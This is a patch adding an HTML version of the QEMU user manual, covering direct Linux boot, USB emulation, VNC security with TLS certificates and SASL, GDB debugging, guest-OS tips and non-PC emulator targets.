+qemu -chardev socket,path=&lt;path&gt;,id=&lt;id&gt;
+</pre>
+<p>When using the server, the guest will be assigned a VM ID (&gt;=0) that allows guests
+using the same server to communicate via interrupts.  Guests can read their
+VM ID from a device register (see example code).  Since receiving the shared
+memory region from the server is asynchronous, there is a (small) chance the
+guest may boot before the shared memory is attached.  To allow an application
+to ensure shared memory is attached, the VM ID register will return -1 (an
+invalid VM ID) until the memory is attached.  Once the shared memory is
+attached, the VM ID will return the guest's valid VM ID.  With these semantics,
+the guest application can check to ensure the shared memory is attached to the
+guest before proceeding.
+
+<p>The <samp><span class="option">role</span></samp> argument can be set to either master or peer and will affect
+how the shared memory is migrated.  With <samp><span class="option">role=master</span></samp>, the guest will
+copy the shared memory on migration to the destination host.  With
+<samp><span class="option">role=peer</span></samp>, the guest will not be able to migrate with the device attached. 
+With the <samp><span class="option">peer</span></samp> case, the device should be detached and then reattached
+after migration using the PCI hotplug support.
+
+<p><a name="direct_linux_boot"></a>
+<a name="direct_005flinux_005fboot"></a>
+
+<h3 class="section">3.9 Direct Linux Boot</h3>
+
+<p>This section explains how to launch a Linux kernel inside QEMU without
+having to make a full bootable image. It is very useful for fast Linux
+kernel testing.
+
+<p>The syntax is:
+<pre class="example">qemu -kernel arch/i386/boot/bzImage -hda root-2.4.20.img -append "root=/dev/hda"
+</pre>
+<p>Use <samp><span class="option">-kernel</span></samp> to provide the Linux kernel image and
+<samp><span class="option">-append</span></samp> to give the kernel command line arguments. The
+<samp><span class="option">-initrd</span></samp> option can be used to provide an INITRD image.
+
+<p>When using the direct Linux boot, a disk image for the first hard disk
+<samp><span class="file">hda</span></samp> is required because its boot sector is used to launch the
+Linux kernel.
+
+<p>If you do not need graphical output, you can disable it and redirect
+the virtual serial port and the QEMU monitor to the console with the
+<samp><span class="option">-nographic</span></samp> option. The typical command line is:
+<pre class="example">qemu -kernel arch/i386/boot/bzImage -hda root-2.4.20.img \
+     -append "root=/dev/hda console=ttyS0" -nographic
+</pre>
+<p>Use &lt;Ctrl-a c&gt; to switch between the serial console and the
+monitor (see <a href="#pcsys_005fkeys">pcsys_keys</a>).
+
+<p><a name="pcsys_usb"></a>
+<a name="pcsys_005fusb"></a>
+
+<h3 class="section">3.10 USB emulation</h3>
+
+<p>QEMU emulates a PCI UHCI USB controller. You can virtually plug
+virtual USB devices or real host USB devices (experimental, works only
+on Linux hosts).  Qemu will automatically create and connect virtual USB hubs
+as necessary to connect multiple USB devices.
+
+<p><a name="usb_devices"></a>
+<a name="usb_005fdevices"></a>
+
+<h4 class="subsection">3.10.1 Connecting USB devices</h4>
+
+<p>USB devices can be connected with the <samp><span class="option">-usbdevice</span></samp> commandline option
+or the <code>usb_add</code> monitor command.  Available devices are:
+
+     <dl>
+<dt><code>mouse</code><dd>Virtual Mouse.  This will override the PS/2 mouse emulation when activated. 
+<br><dt><code>tablet</code><dd>Pointer device that uses absolute coordinates (like a touchscreen). 
+This means qemu is able to report the mouse position without having
+to grab the mouse.  Also overrides the PS/2 mouse emulation when activated. 
+<br><dt><code>disk:</code><var>file</var><dd>Mass storage device based on <var>file</var> (see <a href="#disk_005fimages">disk_images</a>)
+<br><dt><code>host:</code><var>bus.addr</var><dd>Pass through the host device identified by <var>bus.addr</var>
+(Linux only)
+<br><dt><code>host:</code><var>vendor_id:product_id</var><dd>Pass through the host device identified by <var>vendor_id:product_id</var>
+(Linux only)
+<br><dt><code>wacom-tablet</code><dd>Virtual Wacom PenPartner tablet.  This device is similar to the <code>tablet</code>
+above but it can be used with the tslib library because in addition to touch
+coordinates it reports touch pressure. 
+<br><dt><code>keyboard</code><dd>Standard USB keyboard.  Will override the PS/2 keyboard (if present). 
+<br><dt><code>serial:[vendorid=</code><var>vendor_id</var><code>][,product_id=</code><var>product_id</var><code>]:</code><var>dev</var><dd>Serial converter. This emulates an FTDI FT232BM chip connected to host character
+device <var>dev</var>. The available character devices are the same as for the
+<code>-serial</code> option. The <code>vendorid</code> and <code>productid</code> options can be
+used to override the default 0403:6001. For instance,
+     <pre class="example">     usb_add serial:productid=FA00:tcp:192.168.0.2:4444
+</pre>
+     <p>will connect to tcp port 4444 of ip 192.168.0.2, and plug that to the virtual
+serial converter, faking a Matrix Orbital LCD Display (USB ID 0403:FA00). 
+<br><dt><code>braille</code><dd>Braille device.  This will use BrlAPI to display the braille output on a real
+or fake device. 
+<br><dt><code>net:</code><var>options</var><dd>Network adapter that supports CDC ethernet and RNDIS protocols.  <var>options</var>
+specifies NIC options as with <code>-net nic,</code><var>options</var> (see description). 
+For instance, user-mode networking can be used with
+     <pre class="example">     qemu [...OPTIONS...] -net user,vlan=0 -usbdevice net:vlan=0
+</pre>
+     <p>Currently this cannot be used in machines that support PCI NICs. 
+<br><dt><code>bt[:</code><var>hci-type</var><code>]</code><dd>Bluetooth dongle whose type is specified in the same format as with
+the <samp><span class="option">-bt hci</span></samp> option, see <a href="#bt_002dhcis">allowed HCI types</a>.  If
+no type is given, the HCI logic corresponds to <code>-bt hci,vlan=0</code>. 
+This USB device implements the USB Transport Layer of HCI.  Example
+usage:
+     <pre class="example">     qemu [...OPTIONS...] -usbdevice bt:hci,vlan=3 -bt device:keyboard,vlan=3
+</pre>
+     </dl>
+
+<p><a name="host_usb_devices"></a>
+<a name="host_005fusb_005fdevices"></a>
+
+<h4 class="subsection">3.10.2 Using host USB devices on a Linux host</h4>
+
+<p>WARNING: this is an experimental feature. QEMU will slow down when
+using it. USB devices requiring real time streaming (i.e. USB Video
+Cameras) are not supported yet.
+
+     <ol type=1 start=1>
+<li>If you use an early Linux 2.4 kernel, verify that no Linux driver
+is actually using the USB device. A simple way to do that is simply to
+disable the corresponding kernel module by renaming it from <samp><span class="file">mydriver.o</span></samp>
+to <samp><span class="file">mydriver.o.disabled</span></samp>.
+
+     <li>Verify that <samp><span class="file">/proc/bus/usb</span></samp> is working (most Linux distributions should enable it by default). You should see something like that:
+     <pre class="example">     ls /proc/bus/usb
+     001  devices  drivers
+</pre>
+     <li>Since only root can access to the USB devices directly, you can either launch QEMU as root or change the permissions of the USB devices you want to use. For testing, the following suffices:
+     <pre class="example">     chown -R myuid /proc/bus/usb
+</pre>
+     <li>Launch QEMU and do in the monitor:
+     <pre class="example">     info usbhost
+       Device 1.2, speed 480 Mb/s
+         Class 00: USB device 1234:5678, USB DISK
+</pre>
+     <p>You should see the list of the devices you can use (Never try to use
+hubs, it won't work).
+
+     <li>Add the device in QEMU by using:
+     <pre class="example">     usb_add host:1234:5678
+</pre>
+     <p>Normally the guest OS should report that a new USB device is
+plugged. You can use the option <samp><span class="option">-usbdevice</span></samp> to do the same.
+
+     <li>Now you can try to use the host USB device in QEMU.
+
+     </ol>
+
+<p>When relaunching QEMU, you may have to unplug and plug again the USB
+device to make it work again (this is a bug).
+
+<p><a name="vnc_security"></a>
+<a name="vnc_005fsecurity"></a>
+
+<h3 class="section">3.11 VNC security</h3>
+
+<p>The VNC server capability provides access to the graphical console
+of the guest VM across the network. This has a number of security
+considerations depending on the deployment scenarios.
+
+<p><a name="vnc_sec_none"></a>
+<a name="vnc_005fsec_005fnone"></a>
+
+<h4 class="subsection">3.11.1 Without passwords</h4>
+
+<p>The simplest VNC server setup does not include any form of authentication. 
+For this setup it is recommended to restrict it to listen on a UNIX domain
+socket only. For example
+
+<pre class="example">qemu [...OPTIONS...] -vnc unix:/home/joebloggs/.qemu-myvm-vnc
+</pre>
+<p>This ensures that only users on local box with read/write access to that
+path can access the VNC server. To securely access the VNC server from a
+remote machine, a combination of netcat+ssh can be used to provide a secure
+tunnel.
+
+<p><a name="vnc_sec_password"></a>
+<a name="vnc_005fsec_005fpassword"></a>
+
+<h4 class="subsection">3.11.2 With passwords</h4>
+
+<p>The VNC protocol has limited support for password based authentication. Since
+the protocol limits passwords to 8 characters it should not be considered
+to provide high security. The password can be fairly easily brute-forced by
+a client making repeat connections. For this reason, a VNC server using password
+authentication should be restricted to only listen on the loopback interface
+or UNIX domain sockets. Password authentication is requested with the <code>password</code>
+option, and then once QEMU is running the password is set with the monitor. Until
+the monitor is used to set the password all clients will be rejected.
+
+<pre class="example">qemu [...OPTIONS...] -vnc :1,password -monitor stdio
+(qemu) change vnc password
+Password: ********
+(qemu)
+</pre>
+<p><a name="vnc_sec_certificate"></a>
+<a name="vnc_005fsec_005fcertificate"></a>
+
+<h4 class="subsection">3.11.3 With x509 certificates</h4>
+
+<p>The QEMU VNC server also implements the VeNCrypt extension allowing use of
+TLS for encryption of the session, and x509 certificates for authentication. 
+The use of x509 certificates is strongly recommended, because TLS on its
+own is susceptible to man-in-the-middle attacks. Basic x509 certificate
+support provides a secure session, but no authentication. This allows any
+client to connect, and provides an encrypted session.
+
+<pre class="example">qemu [...OPTIONS...] -vnc :1,tls,x509=/etc/pki/qemu -monitor stdio
+</pre>
+<p>In the above example <code>/etc/pki/qemu</code> should contain at least three files,
+<code>ca-cert.pem</code>, <code>server-cert.pem</code> and <code>server-key.pem</code>. Unprivileged
+users will want to use a private directory, for example <code>$HOME/.pki/qemu</code>. 
+NB the <code>server-key.pem</code> file should be protected with file mode 0600 to
+only be readable by the user owning it.
+
+<p><a name="vnc_sec_certificate_verify"></a>
+<a name="vnc_005fsec_005fcertificate_005fverify"></a>
+
+<h4 class="subsection">3.11.4 With x509 certificates and client verification</h4>
+
+<p>Certificates can also provide a means to authenticate the client connecting. 
+The server will request that the client provide a certificate, which it will
+then validate against the CA certificate. This is a good choice if deploying
+in an environment with a private internal certificate authority.
+
+<pre class="example">qemu [...OPTIONS...] -vnc :1,tls,x509verify=/etc/pki/qemu -monitor stdio
+</pre>
+<p><a name="vnc_sec_certificate_pw"></a>
+<a name="vnc_005fsec_005fcertificate_005fpw"></a>
+
+<h4 class="subsection">3.11.5 With x509 certificates, client verification and passwords</h4>
+
+<p>Finally, the previous method can be combined with VNC password authentication
+to provide two layers of authentication for clients.
+
+<pre class="example">qemu [...OPTIONS...] -vnc :1,password,tls,x509verify=/etc/pki/qemu -monitor stdio
+(qemu) change vnc password
+Password: ********
+(qemu)
+</pre>
+<p><a name="vnc_sec_sasl"></a>
+<a name="vnc_005fsec_005fsasl"></a>
+
+<h4 class="subsection">3.11.6 With SASL authentication</h4>
+
+<p>The SASL authentication method is a VNC extension, that provides an
+easily extendable, pluggable authentication method. This allows for
+integration with a wide range of authentication mechanisms, such as
+PAM, GSSAPI/Kerberos, LDAP, SQL databases, one-time keys and more. 
+The strength of the authentication depends on the exact mechanism
+configured. If the chosen mechanism also provides a SSF layer, then
+it will encrypt the datastream as well.
+
+<p>Refer to the later docs on how to choose the exact SASL mechanism
+used for authentication, but assuming use of one supporting SSF,
+then QEMU can be launched with:
+
+<pre class="example">qemu [...OPTIONS...] -vnc :1,sasl -monitor stdio
+</pre>
+<p><a name="vnc_sec_certificate_sasl"></a>
+<a name="vnc_005fsec_005fcertificate_005fsasl"></a>
+
+<h4 class="subsection">3.11.7 With x509 certificates and SASL authentication</h4>
+
+<p>If the desired SASL authentication mechanism does not supported
+SSF layers, then it is strongly advised to run it in combination
+with TLS and x509 certificates. This provides securely encrypted
+data stream, avoiding risk of compromising of the security
+credentials. This can be enabled, by combining the 'sasl' option
+with the aforementioned TLS + x509 options:
+
+<pre class="example">qemu [...OPTIONS...] -vnc :1,tls,x509,sasl -monitor stdio
+</pre>
+<p><a name="vnc_generate_cert"></a>
+<a name="vnc_005fgenerate_005fcert"></a>
+
+<h4 class="subsection">3.11.8 Generating certificates for VNC</h4>
+
+<p>The GNU TLS packages provides a command called <code>certtool</code> which can
+be used to generate certificates and keys in PEM format. At a minimum it
+is necessary to setup a certificate authority, and issue certificates to
+each server. If using certificates for authentication, then each client
+will also need to be issued a certificate. The recommendation is for the
+server to keep its certificates in either <code>/etc/pki/qemu</code> or for
+unprivileged users in <code>$HOME/.pki/qemu</code>.
+
+<p><a name="vnc_generate_ca"></a>
+<a name="vnc_005fgenerate_005fca"></a>
+
+<h5 class="subsubsection">3.11.8.1 Setup the Certificate Authority</h5>
+
+<p>This step only needs to be performed once per organization / organizational
+unit. First the CA needs a private key. This key must be kept VERY secret
+and secure. If this key is compromised the entire trust chain of the certificates
+issued with it is lost.
+
+<pre class="example"># certtool --generate-privkey &gt; ca-key.pem
+</pre>
+<p>A CA needs to have a public certificate. For simplicity it can be a self-signed
+certificate, or one issue by a commercial certificate issuing authority. To
+generate a self-signed certificate requires one core piece of information, the
+name of the organization.
+
+<pre class="example"># cat &gt; ca.info &lt;&lt;EOF
+cn = Name of your organization
+ca
+cert_signing_key
+EOF
+# certtool --generate-self-signed \
+           --load-privkey ca-key.pem
+           --template ca.info \
+           --outfile ca-cert.pem
+</pre>
+<p>The <code>ca-cert.pem</code> file should be copied to all servers and clients wishing to utilize
+TLS support in the VNC server. The <code>ca-key.pem</code> must not be disclosed/copied at all.
+
+<p><a name="vnc_generate_server"></a>
+<a name="vnc_005fgenerate_005fserver"></a>
+
+<h5 class="subsubsection">3.11.8.2 Issuing server certificates</h5>
+
+<p>Each server (or host) needs to be issued with a key and certificate. When connecting
+the certificate is sent to the client which validates it against the CA certificate. 
+The core piece of information for a server certificate is the hostname. This should
+be the fully qualified hostname that the client will connect with, since the client
+will typically also verify the hostname in the certificate. On the host holding the
+secure CA private key:
+
+<pre class="example"># cat &gt; server.info &lt;&lt;EOF
+organization = Name  of your organization
+cn = server.foo.example.com
+tls_www_server
+encryption_key
+signing_key
+EOF
+# certtool --generate-privkey &gt; server-key.pem
+# certtool --generate-certificate \
+           --load-ca-certificate ca-cert.pem \
+           --load-ca-privkey ca-key.pem \
+           --load-privkey server server-key.pem \
+           --template server.info \
+           --outfile server-cert.pem
+</pre>
+<p>The <code>server-key.pem</code> and <code>server-cert.pem</code> files should now be securely copied
+to the server for which they were generated. The <code>server-key.pem</code> is security
+sensitive and should be kept protected with file mode 0600 to prevent disclosure.
+
+<p><a name="vnc_generate_client"></a>
+<a name="vnc_005fgenerate_005fclient"></a>
+
+<h5 class="subsubsection">3.11.8.3 Issuing client certificates</h5>
+
+<p>If the QEMU VNC server is to use the <code>x509verify</code> option to validate client
+certificates as its authentication mechanism, each client also needs to be issued
+a certificate. The client certificate contains enough metadata to uniquely identify
+the client, typically organization, state, city, building, etc. On the host holding
+the secure CA private key:
+
+<pre class="example"># cat &gt; client.info &lt;&lt;EOF
+country = GB
+state = London
+locality = London
+organiazation = Name of your organization
+cn = client.foo.example.com
+tls_www_client
+encryption_key
+signing_key
+EOF
+# certtool --generate-privkey &gt; client-key.pem
+# certtool --generate-certificate \
+           --load-ca-certificate ca-cert.pem \
+           --load-ca-privkey ca-key.pem \
+           --load-privkey client-key.pem \
+           --template client.info \
+           --outfile client-cert.pem
+</pre>
+<p>The <code>client-key.pem</code> and <code>client-cert.pem</code> files should now be securely
+copied to the client for which they were generated.
+
+<p><a name="vnc_setup_sasl"></a>
+<a name="vnc_005fsetup_005fsasl"></a>
+
+<h4 class="subsection">3.11.9 Configuring SASL mechanisms</h4>
+
+<p>The following documentation assumes use of the Cyrus SASL implementation on a
+Linux host, but the principals should apply to any other SASL impl. When SASL
+is enabled, the mechanism configuration will be loaded from system default
+SASL service config /etc/sasl2/qemu.conf. If running QEMU as an
+unprivileged user, an environment variable SASL_CONF_PATH can be used
+to make it search alternate locations for the service config.
+
+<p>The default configuration might contain
+
+<pre class="example">mech_list: digest-md5
+sasldb_path: /etc/qemu/passwd.db
+</pre>
+<p>This says to use the 'Digest MD5' mechanism, which is similar to the HTTP
+Digest-MD5 mechanism. The list of valid usernames &amp; passwords is maintained
+in the /etc/qemu/passwd.db file, and can be updated using the saslpasswd2
+command. While this mechanism is easy to configure and use, it is not
+considered secure by modern standards, so only suitable for developers /
+ad-hoc testing.
+
+<p>A more serious deployment might use Kerberos, which is done with the 'gssapi'
+mechanism
+
+<pre class="example">mech_list: gssapi
+keytab: /etc/qemu/krb5.tab
+</pre>
+<p>For this to work the administrator of your KDC must generate a Kerberos
+principal for the server, with a name of  'qemu/somehost.example.com@EXAMPLE.COM'
+replacing 'somehost.example.com' with the fully qualified host name of the
+machine running QEMU, and 'EXAMPLE.COM' with the Kerberos Realm.
+
+<p>Other configurations will be left as an exercise for the reader. It should
+be noted that only Digest-MD5 and GSSAPI provides a SSF layer for data
+encryption. For all other mechanisms, VNC should always be configured to
+use TLS and x509 certificates to protect security credentials from snooping.
+
+<p><a name="gdb_usage"></a>
+<a name="gdb_005fusage"></a>
+
+<h3 class="section">3.12 GDB usage</h3>
+
+<p>QEMU has a primitive support to work with gdb, so that you can do
+'Ctrl-C' while the virtual machine is running and inspect its state.
+
+<p>In order to use gdb, launch qemu with the '-s' option. It will wait for a
+gdb connection:
+<pre class="example">&gt; qemu -s -kernel arch/i386/boot/bzImage -hda root-2.4.20.img \
+       -append "root=/dev/hda"
+Connected to host network interface: tun0
+Waiting gdb connection on port 1234
+</pre>
+<p>Then launch gdb on the 'vmlinux' executable:
+<pre class="example">&gt; gdb vmlinux
+</pre>
+<p>In gdb, connect to QEMU:
+<pre class="example">(gdb) target remote localhost:1234
+</pre>
+<p>Then you can use gdb normally. For example, type 'c' to launch the kernel:
+<pre class="example">(gdb) c
+</pre>
+<p>Here are some useful tips in order to use gdb on system code:
+
+     <ol type=1 start=1>
+<li>Use <code>info reg</code> to display all the CPU registers. 
+<li>Use <code>x/10i $eip</code> to display the code at the PC position. 
+<li>Use <code>set architecture i8086</code> to dump 16 bit code. Then use
+<code>x/10i $cs*16+$eip</code> to dump the code at the PC position.
+     </ol>
+
+<p>Advanced debugging options:
+
+<p>The default single stepping behavior is step with the IRQs and timer service routines off.  It is set this way because when gdb executes a single step it expects to advance beyond the current instruction.  With the IRQs and and timer service routines on, a single step might jump into the one of the interrupt or exception vectors instead of executing the current instruction. This means you may hit the same breakpoint a number of times before executing the instruction gdb wants to have executed.  Because there are rare circumstances where you want to single step into an interrupt vector the behavior can be controlled from GDB.  There are three commands you can query and set the single step behavior:
+     <dl>
+<dt><code>maintenance packet qqemu.sstepbits</code><dd>
+This will display the MASK bits used to control the single stepping IE:
+     <pre class="example">     (gdb) maintenance packet qqemu.sstepbits
+     sending: "qqemu.sstepbits"
+     received: "ENABLE=1,NOIRQ=2,NOTIMER=4"
+</pre>
+     <br><dt><code>maintenance packet qqemu.sstep</code><dd>
+This will display the current value of the mask used when single stepping IE:
+     <pre class="example">     (gdb) maintenance packet qqemu.sstep
+     sending: "qqemu.sstep"
+     received: "0x7"
+</pre>
+     <br><dt><code>maintenance packet Qqemu.sstep=HEX_VALUE</code><dd>
+This will change the single step mask, so if wanted to enable IRQs on the single step, but not timers, you would use:
+     <pre class="example">     (gdb) maintenance packet Qqemu.sstep=0x5
+     sending: "qemu.sstep=0x5"
+     received: "OK"
+</pre>
+     </dl>
+
+<p><a name="pcsys_os_specific"></a>
+<a name="pcsys_005fos_005fspecific"></a>
+
+<h3 class="section">3.13 Target OS specific information</h3>
+
+<h4 class="subsection">3.13.1 Linux</h4>
+
+<p>To have access to SVGA graphic modes under X11, use the <code>vesa</code> or
+the <code>cirrus</code> X11 driver. For optimal performances, use 16 bit
+color depth in the guest and the host OS.
+
+<p>When using a 2.6 guest Linux kernel, you should add the option
+<code>clock=pit</code> on the kernel command line because the 2.6 Linux
+kernels make very strict real time clock checks by default that QEMU
+cannot simulate exactly.
+
+<p>When using a 2.6 guest Linux kernel, verify that the 4G/4G patch is
+not activated because QEMU is slower with this patch. The QEMU
+Accelerator Module is also much slower in this case. Earlier Fedora
+Core 3 Linux kernel (&lt; 2.6.9-1.724_FC3) were known to incorporate this
+patch by default. Newer kernels don't have it.
+
+<h4 class="subsection">3.13.2 Windows</h4>
+
+<p>If you have a slow host, using Windows 95 is better as it gives the
+best speed. Windows 2000 is also a good choice.
+
+<h5 class="subsubsection">3.13.2.1 SVGA graphic modes support</h5>
+
+<p>QEMU emulates a Cirrus Logic GD5446 Video
+card. All Windows versions starting from Windows 95 should recognize
+and use this graphic card. For optimal performances, use 16 bit color
+depth in the guest and the host OS.
+
+<p>If you are using Windows XP as guest OS and if you want to use high
+resolution modes which the Cirrus Logic BIOS does not support (i.e. &gt;=
+1280x1024x16), then you should use the VESA VBE virtual graphic card
+(option <samp><span class="option">-std-vga</span></samp>).
+
+<h5 class="subsubsection">3.13.2.2 CPU usage reduction</h5>
+
+<p>Windows 9x does not correctly use the CPU HLT
+instruction. The result is that it takes host CPU cycles even when
+idle. You can install the utility from
+<a href="http://www.user.cityline.ru/~maxamn/amnhltm.zip">http://www.user.cityline.ru/~maxamn/amnhltm.zip</a> to solve this
+problem. Note that no such tool is needed for NT, 2000 or XP.
+
+<h5 class="subsubsection">3.13.2.3 Windows 2000 disk full problem</h5>
+
+<p>Windows 2000 has a bug which gives a disk full problem during its
+installation. When installing it, use the <samp><span class="option">-win2k-hack</span></samp> QEMU
+option to enable a specific workaround. After Windows 2000 is
+installed, you no longer need this option (this option slows down the
+IDE transfers).
+
+<h5 class="subsubsection">3.13.2.4 Windows 2000 shutdown</h5>
+
+<p>Windows 2000 cannot automatically shutdown in QEMU although Windows 98
+can. It comes from the fact that Windows 2000 does not automatically
+use the APM driver provided by the BIOS.
+
+<p>In order to correct that, do the following (thanks to Struan
+Bartlett): go to the Control Panel =&gt; Add/Remove Hardware &amp; Next =&gt;
+Add/Troubleshoot a device =&gt; Add a new device &amp; Next =&gt; No, select the
+hardware from a list &amp; Next =&gt; NT Apm/Legacy Support &amp; Next =&gt; Next
+(again) a few times. Now the driver is installed and Windows 2000 now
+correctly instructs QEMU to shutdown at the appropriate moment.
+
+<h5 class="subsubsection">3.13.2.5 Share a directory between Unix and Windows</h5>
+
+<p>See <a href="#sec_005finvocation">sec_invocation</a> about the help of the option <samp><span class="option">-smb</span></samp>.
+
+<h5 class="subsubsection">3.13.2.6 Windows XP security problem</h5>
+
+<p>Some releases of Windows XP install correctly but give a security
+error when booting:
+<pre class="example">A problem is preventing Windows from accurately checking the
+license for this computer. Error code: 0x800703e6.
+</pre>
+<p>The workaround is to install a service pack for XP after a boot in safe
+mode. Then reboot, and the problem should go away. Since there is no
+network while in safe mode, its recommended to download the full
+installation of SP1 or SP2 and transfer that via an ISO or using the
+vvfat block device ("-hdb fat:directory_which_holds_the_SP").
+
+<h4 class="subsection">3.13.3 MS-DOS and FreeDOS</h4>
+
+<h5 class="subsubsection">3.13.3.1 CPU usage reduction</h5>
+
+<p>DOS does not correctly use the CPU HLT instruction. The result is that
+it takes host CPU cycles even when idle. You can install the utility
+from <a href="http://www.vmware.com/software/dosidle210.zip">http://www.vmware.com/software/dosidle210.zip</a> to solve this
+problem.
+
+<p><a name="QEMU-System-emulator-for-non-PC-targets"></a>
+
+<h2 class="chapter">4 QEMU System emulator for non PC targets</h2>
+
+<p>QEMU is a generic emulator and it emulates many non PC
+machines. Most of the options are similar to the PC emulator. The
+differences are mentioned in the following sections.
+
+<p><a name="PowerPC-System-emulator"></a>
+
+<h3 class="section">4.1 PowerPC System emulator</h3>
+
+<p><a name="index-system-emulation-_0028PowerPC_0029-202"></a>
+Use the executable <samp><span class="file">qemu-system-ppc</span></samp> to simulate a complete PREP
+or PowerMac PowerPC system.
+
+<p>QEMU emulates the following PowerMac peripherals:
+
+     <ul>
+<li>UniNorth or Grackle PCI Bridge
+<li>PCI VGA compatible card with VESA Bochs Extensions
+<li>2 PMAC IDE interfaces with hard disk and CD-ROM support
+<li>NE2000 PCI adapters
+<li>Non Volatile RAM
+<li>VIA-CUDA with ADB keyboard and mouse. 
+</ul>
+
+<p>QEMU emulates the following PREP peripherals:
+
+     <ul>
+<li>PCI Bridge
+<li>PCI VGA compatible card with VESA Bochs Extensions
+<li>2 IDE interfaces with hard disk and CD-ROM support
+<li>Floppy disk
+<li>NE2000 network adapters
+<li>Serial port
+<li>PREP Non Volatile RAM
+<li>PC compatible keyboard and mouse. 
+</ul>
+
+<p>QEMU uses the Open Hack'Ware Open Firmware Compatible BIOS available at
+<a href="http://perso.magic.fr/l_indien/OpenHackWare/index.htm">http://perso.magic.fr/l_indien/OpenHackWare/index.htm</a>.
+
+<p>Since version 0.9.1, QEMU uses OpenBIOS <a href="http://www.openbios.org/">http://www.openbios.org/</a>
+for the g3beige and mac99 PowerMac machines. OpenBIOS is a free (GPL
+v2) portable firmware implementation. The goal is to implement a 100%
+IEEE 1275-1994 (referred to as Open Firmware) compliant firmware.
+
+<!-- man begin OPTIONS -->
+<p>The following options are specific to the PowerPC emulation:
+
+     <dl>
+<dt><samp><span class="option">-g </span><var>W</var><span class="option">x</span><var>H</var><span class="option">[x</span><var>DEPTH</var><span class="option">]</span></samp><dd>
+Set the initial VGA graphic mode. The default is 800x600x15.
+
+     <br><dt><samp><span class="option">-prom-env </span><var>string</var></samp><dd>
+Set OpenBIOS variables in NVRAM, for example:
+
+     <pre class="example">     qemu-system-ppc -prom-env 'auto-boot?=false' \
+      -prom-env 'boot-device=hd:2,\yaboot' \
+      -prom-env 'boot-args=conf=hd:2,\yaboot.conf'
+</pre>
+     <p>These variables are not used by Open Hack'Ware.
+
+</dl>
+
+<!-- man end -->
+<p>More information is available at
+<a href="http://perso.magic.fr/l_indien/qemu-ppc/">http://perso.magic.fr/l_indien/qemu-ppc/</a>.
+
+<p><a name="Sparc32-System-emulator"></a>
+
+<h3 class="section">4.2 Sparc32 System emulator</h3>
+
+<p><a name="index-system-emulation-_0028Sparc32_0029-203"></a>
+Use the executable <samp><span class="file">qemu-system-sparc</span></samp> to simulate the following
+Sun4m architecture machines:
+     <ul>
+<li>SPARCstation 4
+<li>SPARCstation 5
+<li>SPARCstation 10
+<li>SPARCstation 20
+<li>SPARCserver 600MP
+<li>SPARCstation LX
+<li>SPARCstation Voyager
+<li>SPARCclassic
+<li>SPARCbook
+</ul>
+
+<p>The emulation is somewhat complete. SMP up to 16 CPUs is supported,
+but Linux limits the number of usable CPUs to 4.
+
+<p>It's also possible to simulate a SPARCstation 2 (sun4c architecture),
+SPARCserver 1000, or SPARCcenter 2000 (sun4d architecture), but these
+emulators are not usable yet.
+
+<p>QEMU emulates the following sun4m/sun4c/sun4d peripherals:
+
+     <ul>
+<li>IOMMU or IO-UNITs
+<li>TCX Frame buffer
+<li>Lance (Am7990) Ethernet
+<li>Non Volatile RAM M48T02/M48T08
+<li>Slave I/O: timers, interrupt controllers, Zilog serial ports, keyboard
+and power/reset logic
+<li>ESP SCSI controller with hard disk and CD-ROM support
+<li>Floppy drive (not on SS-600MP)
+<li>CS4231 sound device (only on SS-5, not working yet)
+</ul>
+
+<p>The number of peripherals is fixed in the architecture.  Maximum
+memory size depends on the machine type, for SS-5 it is 256MB and for
+others 2047MB.
+
+<p>Since version 0.8.2, QEMU uses OpenBIOS
+<a href="http://www.openbios.org/">http://www.openbios.org/</a>. OpenBIOS is a free (GPL v2) portable
+firmware implementation. The goal is to implement a 100% IEEE
+1275-1994 (referred to as Open Firmware) compliant firmware.
+
+<p>A sample Linux 2.6 series kernel and ram disk image are available on
+the QEMU web site. There are still issues with NetBSD and OpenBSD, but
+some kernel versions work. Please note that currently Solaris kernels
+don't work probably due to interface issues between OpenBIOS and
+Solaris.
+
+<!-- man begin OPTIONS -->
+<p>The following options are specific to the Sparc32 emulation:
+
+     <dl>
+<dt><samp><span class="option">-g </span><var>W</var><span class="option">x</span><var>H</var><span class="option">x[x</span><var>DEPTH</var><span class="option">]</span></samp><dd>
+Set the initial TCX graphic mode. The default is 1024x768x8, currently
+the only other possible mode is 1024x768x24.
+
+     <br><dt><samp><span class="option">-prom-env </span><var>string</var></samp><dd>
+Set OpenBIOS variables in NVRAM, for example:
+
+     <pre class="example">     qemu-system-sparc -prom-env 'auto-boot?=false' \
+      -prom-env 'boot-device=sd(0,2,0):d' -prom-env 'boot-args=linux single'
+</pre>
+     <br><dt><samp><span class="option">-M [SS-4|SS-5|SS-10|SS-20|SS-600MP|LX|Voyager|SPARCClassic] [|SPARCbook|SS-2|SS-1000|SS-2000]</span></samp><dd>
+Set the emulated machine type. Default is SS-5.
+
+</dl>
+
+<!-- man end -->
+<p><a name="Sparc64-System-emulator"></a>
+
+<h3 class="section">4.3 Sparc64 System emulator</h3>
+
+<p><a name="index-system-emulation-_0028Sparc64_0029-204"></a>
+Use the executable <samp><span class="file">qemu-system-sparc64</span></samp> to simulate a Sun4u
+(UltraSPARC PC-like machine), Sun4v (T1 PC-like machine), or generic
+Niagara (T1) machine. The emulator is not usable for anything yet, but
+it can launch some kernels.
+
+<p>QEMU emulates the following peripherals:
+
+     <ul>
+<li>UltraSparc IIi APB PCI Bridge
+<li>PCI VGA compatible card with VESA Bochs Extensions
+<li>PS/2 mouse and keyboard
+<li>Non Volatile RAM M48T59
+<li>PC-compatible serial ports
+<li>2 PCI IDE interfaces with hard disk and CD-ROM support
+<li>Floppy disk
+</ul>
+
+<!-- man begin OPTIONS -->
+<p>The following options are specific to the Sparc64 emulation:
+
+     <dl>
+<dt><samp><span class="option">-prom-env </span><var>string</var></samp><dd>
+Set OpenBIOS variables in NVRAM, for example:
+
+     <pre class="example">     qemu-system-sparc64 -prom-env 'auto-boot?=false'
+</pre>
+     <br><dt><samp><span class="option">-M [sun4u|sun4v|Niagara]</span></samp><dd>
+Set the emulated machine type. The default is sun4u.
+
+</dl>
+
+<!-- man end -->
+<p><a name="MIPS-System-emulator"></a>
+
+<h3 class="section">4.4 MIPS System emulator</h3>
+
+<p><a name="index-system-emulation-_0028MIPS_0029-205"></a>
+Four executables cover simulation of 32 and 64-bit MIPS systems in
+both endian options, <samp><span class="file">qemu-system-mips</span></samp>, <samp><span class="file">qemu-system-mipsel</span></samp>
+<samp><span class="file">qemu-system-mips64</span></samp> and <samp><span class="file">qemu-system-mips64el</span></samp>. 
+Five different machine types are emulated:
+
